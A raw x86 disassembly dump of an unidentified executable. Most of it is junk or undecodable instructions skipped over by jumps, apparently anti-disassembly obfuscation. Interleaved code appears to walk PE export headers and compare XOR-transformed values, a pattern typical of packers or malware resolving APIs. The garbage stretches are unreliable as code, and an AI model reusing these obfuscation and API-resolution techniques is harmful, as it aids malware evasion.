  40f109:	js     0x40f09d
  40f10b:	push   ebp
  40f10c:	aam    0x6f
  40f10e:	adc    BYTE PTR [eax+0x1ba675fa],al
  40f114:	enter  0x8975,0xc5
  40f118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f119:	pop    esi
  40f11a:	fistp  WORD PTR [ecx+0x12]
  40f11d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f11e:	call   0xcfe7:0x90e182b7
  40f125:	mov    bl,BYTE PTR [ebp+ebp*1+0x4f7836ed]
  40f12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f12d:	std    
  40f12e:	in     eax,0xd9
  40f130:	or     eax,0x7c6ba111
  40f135:	xor    BYTE PTR [ecx],dh
  40f137:	cmp    al,0x60
  40f139:	(bad)  
  40f13a:	in     al,dx
  40f13b:	sbb    eax,0xd797e440
  40f140:	sahf   
  40f141:	dec    ebx
  40f142:	leave  
  40f143:	inc    eax
  40f144:	mul    DWORD PTR ds:0x430ab086
  40f14a:	dec    ebp
  40f14b:	adc    eax,edi
  40f14d:	(bad)  
  40f14e:	sbb    dh,BYTE PTR [edi+0xf953992]
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   ebx,ecx
  40f16e:	adc    eax,0xaaa3baa0
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1d6
  40f17a:	int    0xdd
  40f17c:	mov    ebx,0x4db582b3
  40f181:	scas   eax,DWORD PTR es:[edi]
  40f182:	loope  0x40f143
  40f184:	fnstsw WORD PTR [ebx-0x2c4720b1]
  40f18a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f18b:	mov    ebx,0x2b2a0dbc
  40f190:	icebp  
  40f191:	sets   BYTE PTR [edx]
  40f194:	fcom   DWORD PTR [eax+0x307935aa]
  40f19a:	lods   al,BYTE PTR ds:[esi]
  40f19b:	std    
  40f19c:	mov    ch,0xc0
  40f19e:	mov    ecx,0xcd189e08
  40f1a3:	out    0xba,eax
  40f1a5:	mov    al,0x49
  40f1a7:	loope  0x40f202
  40f1a9:	pop    ds
  40f1aa:	xor    esp,DWORD PTR [ebx]
  40f1ac:	jmp    edi
  40f1ae:	test   esp,edi
  40f1b0:	cwde   
  40f1b1:	les    edi,FWORD PTR ss:[edi+0x50]
  40f1b5:	add    eax,0xda1dc19c
  40f1ba:	cmp    esp,ebx
  40f1bc:	(bad)  
  40f1bd:	sub    ch,BYTE PTR [edx]
  40f1bf:	mov    ebp,0x9857feb
  40f1c4:	mov    cl,0xb
  40f1c6:	inc    ebp
  40f1c7:	out    0xb2,al
  40f1c9:	cmc    
  40f1ca:	sub    ebx,DWORD PTR [edx-0x3dbb3368]
  40f1d0:	loopne 0x40f24a
  40f1d2:	jmp    ecx
  40f1d4:	xchg   ebp,eax
  40f1d5:	pop    esp
  40f1d6:	lock lods al,BYTE PTR ds:[esi]
  40f1d8:	daa    
  40f1d9:	xchg   edi,eax
  40f1da:	loope  0x40f217
  40f1dc:	retf   
  40f1dd:	fcmovu st,st(4)
  40f1df:	cmc    
  40f1e0:	sub    esi,DWORD PTR [esi+eax*8]
  40f1e3:	(bad)  
  40f1e4:	push   ds
  40f1e5:	cld    
  40f1e6:	and    al,0x69
  40f1e8:	shl    DWORD PTR [eax],cl
  40f1ea:	jne    0x40f207
  40f1ec:	cmp    al,0xa7
  40f1ee:	fild   QWORD PTR [esi]
  40f1f0:	das    
  40f1f1:	ret    0xfd8b
  40f1f4:	std    
  40f1f5:	outs   dx,BYTE PTR ds:[esi]
  40f1f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1f7:	jge    0x40f276
  40f1f9:	or     BYTE PTR [edi],al
  40f1fb:	xchg   ebp,eax
  40f1fc:	test   DWORD PTR [edx+0x16],0xa976a5d
  40f203:	ret    0x16d5
  40f206:	repz (bad) 
  40f208:	jmp    0x40f1e7
  40f20a:	pop    esp
  40f20b:	lock or dl,dl
  40f20e:	retf   0x7bdd
  40f211:	add    edi,DWORD PTR [edi-0x1a810124]
  40f217:	out    0x2e,eax
  40f219:	je     0x40f28c
  40f21b:	pop    eax
  40f21c:	in     al,dx
  40f21d:	sbb    al,0x38
  40f21f:	jno    0x40f1fb
  40f221:	sbb    eax,0xe0ce475a
  40f226:	jbe    0x40f280
  40f228:	sbb    BYTE PTR [ecx+0x4d],bh
  40f22b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f22c:	je     0x40f207
  40f22e:	mov    cl,0x5d
  40f230:	pop    ds
  40f231:	pop    ss
  40f232:	mov    esp,0x6a64e343
  40f237:	out    0xf3,eax
  40f239:	stc    
  40f23a:	sahf   
  40f23b:	imul   esp,DWORD PTR [edi-0x718e1937],0x17
  40f242:	mov    ds:0xe677efb5,eax
  40f247:	ret    0xb142
  40f24a:	ins    DWORD PTR es:[edi],dx
  40f24b:	fcmovnb st,st(2)
  40f24d:	adc    al,0xc7
  40f24f:	sbb    al,0x1b
  40f251:	xchg   edx,eax
  40f252:	jmp    0x68b5:0x489f1c2c
  40f259:	cmp    BYTE PTR [ebp+0x73],dl
  40f25c:	je     0x40f280
  40f25e:	and    DWORD PTR [edx+esi*4+0x226723f2],ebx
  40f265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f266:	ins    BYTE PTR es:[edi],dx
  40f267:	xchg   edx,eax
  40f268:	cdq    
  40f269:	push   esi
  40f26a:	sub    al,0x8d
  40f26c:	xor    DWORD PTR [esi],ebx
  40f26e:	(bad)  
  40f26f:	shr    BYTE PTR [eax-0x59e5f70],1
  40f275:	push   eax
  40f276:	pop    ds
  40f277:	pop    ss
  40f278:	mov    si,WORD PTR cs:[eax-0x6d]
  40f27d:	and    DWORD PTR [ebp+0x6],ebx
  40f280:	(bad)  
  40f281:	sbb    eax,DWORD PTR [esi+esi*8+0x1f94711b]
  40f288:	cmp    edx,ebp
  40f28a:	gs mov al,0xb3
  40f28d:	ror    DWORD PTR [ebx-0x4c],1
  40f290:	loopne 0x40f24a
  40f292:	xchg   DWORD PTR [ecx],edx
  40f294:	fidivr WORD PTR [eax-0x6]
  40f297:	loop   0x40f2bb
  40f299:	nop
  40f29a:	outs   dx,DWORD PTR ds:[esi]
  40f29b:	adc    BYTE PTR es:[ebp+0x694fa879],ch
  40f2a2:	hlt    
  40f2a3:	mov    BYTE PTR [esi],bh
  40f2a5:	out    dx,eax
  40f2a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2a7:	push   ebx
  40f2a8:	ret    
  40f2a9:	mov    esi,0xbf93d5b5
  40f2ae:	test   eax,0x9a6e6d1e
  40f2b3:	adc    ecx,ebp
  40f2b5:	jle    0x40f24a
  40f2b7:	mov    ?,WORD PTR [ecx]
  40f2b9:	xchg   ebx,eax
  40f2ba:	push   es
  40f2bb:	scas   eax,DWORD PTR es:[edi]
  40f2bc:	mov    edx,0xdfab35e6
  40f2c1:	shl    DWORD PTR [edx+0x10],1
  40f2c4:	ret    
  40f2c5:	pop    ebp
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	shr    BYTE PTR [edx],1
  40f2f8:	or     al,BYTE PTR [edi]
  40f2fa:	addr16 jbe 0x40f2a6
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f2d4
  40f304:	push   ebp
  40f305:	push   eax
  40f306:	cdq    
  40f307:	in     eax,dx
  40f308:	into   
  40f309:	jp     0x2c97aa5c
  40f30f:	or     al,0xa0
  40f311:	outs   dx,DWORD PTR ds:[esi]
  40f312:	cwde   
  40f313:	dec    edi
  40f314:	aad    0x52
  40f316:	xchg   ecx,eax
  40f317:	sub    ch,BYTE PTR [ebp-0x3db0d3dd]
  40f31d:	fucomp st(3)
  40f31f:	jg     0x40f2d9
  40f321:	add    al,0x5b
  40f323:	jmp    0xeb40:0x8d0fd7a9
  40f32a:	(bad)  
  40f32b:	js     0x40f361
  40f32d:	push   ds
  40f32e:	loop   0x40f32b
  40f330:	mov    ah,0xac
  40f332:	mov    ecx,DWORD PTR [ebp-0x7f]
  40f335:	jmp    0x2fd64d00
  40f33a:	jnp    0x40f2e5
  40f33c:	mov    edx,DWORD PTR [edi+0x2473e052]
  40f342:	jbe    0x40f35e
  40f344:	sub    bh,BYTE PTR [esi-0x2c875573]
  40f34a:	dec    eax
  40f34b:	xor    BYTE PTR [eax],bl
  40f34d:	xchg   edx,eax
  40f34e:	inc    edi
  40f34f:	out    dx,eax
  40f350:	test   eax,0xce4f35cd
  40f355:	aaa    
  40f356:	fwait
  40f357:	retf   
  40f358:	fucomi st,st(2)
  40f35a:	sbb    al,0x15
  40f35c:	mov    dh,0xb0
  40f35e:	shrd   DWORD PTR [ebx-0x2be58ef6],ecx,0x6d
  40f366:	dec    esp
  40f367:	inc    ebp
  40f368:	sbb    cl,cl
  40f36a:	jno    0x40f34f
  40f36c:	inc    ebx
  40f36d:	lea    edx,[esi-0x764e0d]
  40f373:	sar    edx,cl
  40f375:	call   0x9a6a:0xce22eb22
  40f37c:	mov    BYTE PTR [ebx-0x30],dh
  40f37f:	mov    ds:0xfce23728,al
  40f384:	scas   al,BYTE PTR es:[edi]
  40f385:	sar    BYTE PTR [eax-0x2dd52034],cl
  40f38b:	xchg   edi,eax
  40f38c:	xor    DWORD PTR [edx-0x7cca8b38],ebx
  40f392:	xlat   BYTE PTR ds:[ebx]
  40f393:	fbld   TBYTE PTR [ebp-0x407bacca]
  40f399:	(bad)  
  40f39a:	out    0xd9,eax
  40f39c:	lahf   
  40f39d:	adc    al,0xc7
  40f39f:	cmp    BYTE PTR [eax+0x1c],dh
  40f3a2:	mov    edx,cr14
  40f3a6:	daa    
  40f3a7:	sub    eax,0xaf3d4eaa
  40f3ac:	jle    0x40f3dd
  40f3ae:	ret    
  40f3af:	inc    ebp
  40f3b0:	jg     0x40f3cd
  40f3b2:	pop    ecx
  40f3b3:	ffreep st(7)
  40f3b5:	ds xchg ebx,eax
  40f3b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3b8:	cmp    BYTE PTR [edx],al
  40f3ba:	imul   edi,DWORD PTR [eax-0x4c],0x979072b9
  40f3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3c2:	cmp    bl,dh
  40f3c4:	inc    eax
  40f3c5:	pop    eax
  40f3c6:	test   al,0x98
  40f3c8:	jnp    0x40f3bc
  40f3ca:	mov    bh,0x80
  40f3cc:	and    eax,0xb22a2913
  40f3d1:	sbb    esp,DWORD PTR [ecx+0x65fe5449]
  40f3d7:	jle    0x40f445
  40f3d9:	dec    eax
  40f3da:	pop    ebp
  40f3db:	jp     0x40f432
  40f3dd:	xchg   DWORD PTR [eax+0xe],edi
  40f3e0:	es add eax,0x84180128
  40f3e6:	mov    ebp,0xca61b54d
  40f3eb:	lds    eax,FWORD PTR ds:0xfc98d73d
  40f3f1:	jb     0x40f3a2
  40f3f3:	or     edi,esi
  40f3f5:	push   0xffffff8a
  40f3f7:	mov    edi,0x49f9661
  40f3fc:	stos   DWORD PTR es:[edi],eax
  40f3fd:	xor    edx,DWORD PTR [ebx-0x1a675b6f]
  40f403:	mov    esp,0x41bd6d3
  40f408:	int    0x8d
  40f40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f40b:	inc    ebx
  40f40c:	nop
  40f40d:	jbe    0x40f3c9
  40f40f:	dec    esi
  40f410:	add    ch,BYTE PTR [ecx+0x31310c0b]
  40f416:	mov    dl,0x56
  40f418:	adc    DWORD PTR [ebp-0x5541fa23],esi
  40f41e:	xchg   DWORD PTR [edx-0x72],ecx
  40f421:	(bad)  
  40f422:	mov    ebx,gs
  40f424:	mov    dl,0xc4
  40f426:	stos   BYTE PTR es:[edi],al
  40f427:	in     eax,0x3c
  40f429:	mov    dl,0xa5
  40f42b:	mov    ds:0xee940734,al
  40f430:	xlat   BYTE PTR ds:[ebx]
  40f431:	cs cmp eax,0xc557518a
  40f437:	lods   al,BYTE PTR ds:[esi]
  40f438:	jecxz  0x40f3fc
  40f43a:	adc    ch,BYTE PTR [ebp-0x4effd133]
  40f440:	jl     0x40f3d9
  40f442:	lds    edi,FWORD PTR [ebx+0x46102c45]
  40f448:	test   eax,0x6faef47c
  40f44d:	mov    ds:0x458b9210,eax
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	jae    0x40f405
  40f466:	lahf   
  40f467:	int3   
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	sti    
  40f471:	int    0x59
  40f473:	xor    al,0xbd
  40f475:	jge    0x40f468
  40f477:	inc    ebx
  40f478:	mov    DWORD PTR [eax+0x7a],0xfcc124cb
  40f47f:	lods   eax,DWORD PTR ds:[esi]
  40f480:	mov    bh,BYTE PTR [esp-0x1b]
  40f484:	gs sbb al,0xa3
  40f487:	lock sbb al,0xf6
  40f48a:	adc    ebp,0x8c867378
  40f490:	icebp  
  40f491:	adc    BYTE PTR [esp],bl
  40f494:	add    DWORD PTR [ecx-0x50],eax
  40f497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f498:	idiv   BYTE PTR [ebp+ecx*2-0x2e]
  40f49c:	dec    eax
  40f49d:	fisttp DWORD PTR [edi]
  40f49f:	push   ecx
  40f4a0:	retf   
  40f4a1:	(bad)
  40f4a4:	fisttp DWORD PTR [edi-0x32c88d65]
  40f4aa:	jo     0x40f505
  40f4ac:	sahf   
  40f4ad:	ins    DWORD PTR es:[edi],dx
  40f4ae:	mov    ebp,0xa8263f5b
  40f4b3:	adc    al,0x20
  40f4b5:	adc    edx,DWORD PTR [edi-0x2a0c6506]
  40f4bb:	daa    
  40f4bc:	dec    esp
  40f4bd:	shr    DWORD PTR [eax],1
  40f4bf:	pop    ss
  40f4c0:	fstp   st(3)
  40f4c2:	push   ebp
  40f4c3:	inc    esi
  40f4c4:	jp     0x40f4cf
  40f4c6:	push   esp
  40f4c7:	dec    esp
  40f4c8:	ror    BYTE PTR [esi],1
  40f4ca:	xor    eax,0xa456b0f9
  40f4cf:	pop    ss
  40f4d0:	jmp    DWORD PTR [edi-0x10a6cfa5]
  40f4d6:	xor    DWORD PTR [ebp-0x29c004e9],eax
  40f4dc:	jae    0x40f4eb
  40f4de:	push   cs
  40f4df:	fsubr  DWORD PTR ds:0xc48a73d3
  40f4e5:	rcl    dl,0x2c
  40f4e8:	xchg   eax,edi
  40f4ea:	mov    eax,ds:0xca40db7e
  40f4ef:	xlat   BYTE PTR ds:[ebx]
  40f4f0:	dec    ebp
  40f4f1:	cmp    bl,BYTE PTR [eax+0x9921e61]
  40f4f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f8:	xor    DWORD PTR [edx+0x15bb259],ebp
  40f4fe:	xchg   ecx,eax
  40f4ff:	jl     0x40f4a8
  40f501:	fwait
  40f502:	xchg   ecx,eax
  40f503:	pushf  
  40f504:	xor    dh,bl
  40f506:	hlt    
  40f507:	mov    dh,0x3b
  40f509:	push   eax
  40f50a:	pop    eax
  40f50b:	sbb    BYTE PTR [ecx-0x34],dl
  40f50e:	loope  0x40f551
  40f510:	dec    eax
  40f511:	(bad)  
  40f512:	pop    ebx
  40f513:	daa    
  40f514:	mov    ds:0xe0c81117,eax
  40f519:	inc    eax
  40f51a:	xchg   esi,eax
  40f51b:	ins    BYTE PTR es:[edi],dx
  40f51c:	xchg   ecx,eax
  40f51d:	push   esp
  40f51e:	lahf   
  40f51f:	rcr    BYTE PTR [ebp+0x30939c69],cl
  40f525:	mov    dh,0xf8
  40f527:	xchg   ebp,eax
  40f528:	popf   
  40f529:	dec    esp
  40f52a:	add    DWORD PTR [esi+0x11],0x6084df6a
  40f531:	jo     0x40f52b
  40f533:	in     al,dx
  40f534:	jae    0x40f4d5
  40f536:	clc    
  40f537:	mov    cl,0x4a
  40f539:	loope  0x40f57f
  40f53b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f53c:	inc    ebx
  40f53d:	adc    eax,0x1e90eb13
  40f542:	into   
  40f543:	ds xor al,0xe0
  40f546:	and    ecx,DWORD PTR [edi]
  40f548:	jbe    0x40f5b0
  40f54a:	sahf   
  40f54b:	inc    esp
  40f54c:	push   esi
  40f54d:	cmp    BYTE PTR [ebp-0x30],0xfe
  40f551:	mov    gs,WORD PTR [eax+0x2f]
  40f554:	sub    ch,BYTE PTR [eax+0xaad1887]
  40f55a:	cmp    DWORD PTR [eax-0x27b09668],esi
  40f560:	mov    eax,0x640d127e
  40f565:	cld    
  40f566:	push   eax
  40f567:	data16 out 0xa2,al
  40f56a:	in     eax,dx
  40f56b:	stos   DWORD PTR es:[edi],eax
  40f56c:	call   0x8e5:0x5c53c96a
  40f573:	mov    eax,0x8f5a79f5
  40f578:	xchg   BYTE PTR ds:0x76b4e085,al
  40f57e:	mov    edx,0xa4543e3d
  40f583:	jb     0x40f5c7
  40f585:	mov    ds:0xd6b58a0e,al
  40f58a:	mov    ebx,0x56a118b0
  40f58f:	sub    al,0x7
  40f591:	mov    bl,BYTE PTR [ecx]
  40f593:	je     0x40f5f4
  40f595:	loop   0x40f563
  40f597:	sub    eax,0xbfd26aa0
  40f59c:	xor    al,0xd6
  40f59e:	(bad)  
  40f59f:	(bad)  
  40f5a0:	jp     0x40f5bb
  40f5a2:	mov    cl,0x82
  40f5a4:	daa    
  40f5a5:	rcl    BYTE PTR [edi],1
  40f5a7:	in     al,dx
  40f5a8:	sbb    BYTE PTR [edi+0x34ce5c1d],dh
  40f5ae:	pop    ebp
  40f5af:	sti    
  40f5b0:	jmp    0xd86ff119
  40f5b5:	pop    esp
  40f5b6:	retf   
  40f5b7:	xchg   DWORD PTR [esi+0x4d0ae6be],eax
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	cmp    al,al
  40f605:	in     al,0x5a
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	lods   eax,DWORD PTR ds:[esi]
  40f610:	mov    WORD PTR [esp+edi*2],es
  40f613:	sbb    BYTE PTR [eax-0x59],ah
  40f616:	popf   
  40f617:	lea    edi,[eax]
  40f619:	cld    
  40f61a:	mov    dh,0x44
  40f61c:	mov    esp,DWORD PTR [esi+esi*1-0x3d]
  40f620:	mov    esi,0x6284a2a4
  40f625:	lods   eax,DWORD PTR ds:[esi]
  40f626:	dec    esi
  40f627:	sahf   
  40f628:	es loopne 0x40f655
  40f62b:	push   0xfffffff9
  40f62d:	or     eax,0xd5db8ba1
  40f632:	jle    0x40f5e3
  40f634:	add    al,0xe4
  40f636:	data16 sub al,0x12
  40f639:	cmp    eax,0xeb24a6d7
  40f63e:	stos   BYTE PTR es:[edi],al
  40f63f:	xor    dl,al
  40f641:	test   eax,0xc8c585b3
  40f646:	lods   al,BYTE PTR ds:[esi]
  40f647:	(bad)  
  40f648:	cmp    DWORD PTR [esi+0x56],eax
  40f64b:	mov    ds:0xdb7a299a,al
  40f650:	test   edx,eax
  40f652:	add    dl,BYTE PTR [edx]
  40f654:	int3   
  40f655:	pand   mm1,QWORD PTR [eax]
  40f658:	lock lea ebx,[edx+0x4e3c1553]
  40f65f:	dec    bl
  40f661:	sbb    cl,BYTE PTR [edx]
  40f663:	add    edi,DWORD PTR [eax-0xa683a31]
  40f669:	call   0x715de136
  40f66e:	xor    al,0xa0
  40f670:	call   FWORD PTR [edi+0x70bf6c34]
  40f676:	mov    ds:0xbcc383e2,eax
  40f67b:	clc    
  40f67c:	jno    0x40f69d
  40f67e:	inc    DWORD PTR [eax+0x5e3a1db3]
  40f684:	or     ebp,DWORD PTR [ecx+0x41]
  40f687:	mov    al,0x5d
  40f689:	neg    BYTE PTR [eax]
  40f68b:	ja     0x40f6e7
  40f68d:	mov    al,0x1b
  40f68f:	sub    DWORD PTR [esi+eiz*2],ebp
  40f692:	add    ch,ah
  40f694:	in     al,dx
  40f695:	loopne 0x40f682
  40f697:	stos   DWORD PTR es:[edi],eax
  40f698:	into   
  40f699:	push   0x36
  40f69b:	inc    ebx
  40f69c:	push   cs
  40f69d:	jg     0x40f644
  40f69f:	ss aas 
  40f6a1:	in     al,dx
  40f6a2:	add    ah,BYTE PTR [eax]
  40f6a4:	mov    BYTE PTR [ebp-0x664279be],0x4c
  40f6ab:	aas    
  40f6ac:	(bad)  
  40f6ad:	jmp    0xa6a18924
  40f6b2:	das    
  40f6b3:	add    ecx,0x4
  40f6b6:	retf   0x64ca
  40f6b9:	cld    
  40f6ba:	jb     0x40f690
  40f6bc:	jl     0x40f670
  40f6be:	and    DWORD PTR [ebx+edx*2-0x53d5086d],0xffffff8d
  40f6c6:	xchg   esp,eax
  40f6c7:	xchg   ebp,eax
  40f6c8:	es cli 
  40f6ca:	pop    ebx
  40f6cb:	cld    
  40f6cc:	adc    al,0x55
  40f6ce:	sbb    BYTE PTR [eax-0x6b],bl
  40f6d1:	adc    DWORD PTR [edx-0x7095bb9b],ecx
  40f6d7:	dec    ebp
  40f6d8:	out    0xba,eax
  40f6da:	clc    
  40f6db:	je     0x40f707
  40f6dd:	retf   0xb331
  40f6e0:	call   0xb86e:0x390503d2
  40f6e7:	pusha  
  40f6e8:	leave  
  40f6e9:	pushf  
  40f6ea:	in     eax,dx
  40f6eb:	mov    eax,0xede281e6
  40f6f0:	jne    0x40f6ca
  40f6f2:	jmp    0x40f76f
  40f6f4:	(bad)  
  40f6f6:	jge    0x40f6a2
  40f6f8:	pop    ebx
  40f6f9:	pop    edi
  40f6fa:	scas   eax,DWORD PTR es:[edi]
  40f6fb:	cmc    
  40f6fc:	ja     0x40f77d
  40f6fe:	mov    esi,0x32ebdef8
  40f703:	xchg   ebp,eax
  40f704:	(bad)  
  40f705:	cmp    eax,0x9b405a24
  40f70a:	mov    DWORD PTR [ebp-0x3716ba3c],edi
  40f710:	fdiv   QWORD PTR [ebx-0x62]
  40f713:	pop    edi
  40f714:	sub    ch,BYTE PTR [ebx]
  40f716:	xchg   ebx,eax
  40f717:	xor    esi,ebp
  40f719:	inc    esp
  40f71a:	je     0x40f71c
  40f71c:	aam    0xca
  40f71e:	mov    cl,0x54
  40f720:	shl    BYTE PTR [edx-0x59],0x34
  40f724:	(bad)  
  40f725:	lds    ebp,FWORD PTR [edi-0x1d]
  40f728:	sub    eax,0x6a89da2b
  40f72d:	xor    al,0x3c
  40f72f:	sbb    al,0xd
  40f731:	repnz or esi,DWORD PTR [ebx+ebp*1-0x1d5d5f9b]
  40f739:	mul    BYTE PTR [esp+esi*1-0x3f71e06d]
  40f740:	or     DWORD PTR [esi-0x10],ecx
  40f743:	xlat   BYTE PTR ds:[ebx]
  40f744:	sub    eax,0x3cfd03f9
  40f749:	in     eax,dx
  40f74a:	cs pop edi
  40f74c:	sub    BYTE PTR fs:[ebx+0x54e2baa9],bl
  40f753:	aad    0x9b
  40f755:	adc    al,cl
  40f757:	cli    
  40f758:	mov    edi,0x8b5f4d3c
  40f75d:	inc    ebp
  40f75e:	clc    
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x485946f3
  40f7e3:	or     ecx,DWORD PTR [eax+0x5f]
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f851
  40f7ee:	lods   al,BYTE PTR ds:[esi]
  40f7ef:	and    edx,DWORD PTR [ebp+0x46]
  40f7f2:	mov    DWORD PTR [eax+0x72c83eb5],esi
  40f7f8:	fwait
  40f7f9:	lock add eax,0xf0f8cfb4
  40f7ff:	or     BYTE PTR [edx],ch
  40f801:	cmp    bl,BYTE PTR [edi]
  40f803:	dec    edx
  40f804:	add    eax,0x593bf89
  40f809:	sbb    DWORD PTR [edx+esi*2],0xffffffe8
  40f80d:	stc    
  40f80e:	(bad)  
  40f80f:	out    0x23,al
  40f811:	rol    BYTE PTR [edx-0x1b0d003b],0xe2
  40f818:	iret   
  40f819:	rol    esi,1
  40f81b:	int    0xa8
  40f81d:	ret    
  40f81e:	mov    ds:0x3589e9fb,al
  40f823:	clc    
  40f824:	pop    ebp
  40f825:	adc    BYTE PTR [edx],ah
  40f827:	jmp    0x3c7f4b91
  40f82c:	push   ecx
  40f82d:	pop    eax
  40f82e:	addr16 (bad) 
  40f830:	es nop
  40f832:	mov    al,ds:0x755a7c3
  40f837:	mov    al,0x18
  40f839:	ins    DWORD PTR es:[edi],dx
  40f83a:	bound  ecx,QWORD PTR [ecx]
  40f83c:	pusha  
  40f83d:	dec    edi
  40f83e:	jnp    0x40f830
  40f840:	test   BYTE PTR [ecx+0x2a],dh
  40f843:	shr    DWORD PTR [ecx],1
  40f845:	(bad)  
  40f846:	mov    esi,eax
  40f848:	into   
  40f849:	and    esp,DWORD PTR [edx-0x5b82d42b]
  40f84f:	add    al,0x52
  40f851:	inc    ebx
  40f852:	mov    edx,0x11b546b4
  40f857:	jb     0x40f84f
  40f859:	xchg   ebx,eax
  40f85a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f85b:	hlt    
  40f85c:	cs or  al,0x26
  40f85f:	pop    esp
  40f860:	stos   BYTE PTR es:[edi],al
  40f861:	in     al,0x97
  40f863:	ror    BYTE PTR ds:0xcc77e49c,0xe4
  40f86a:	mov    ebp,0xc492d014
  40f86f:	sahf   
  40f870:	push   es
  40f871:	popa   
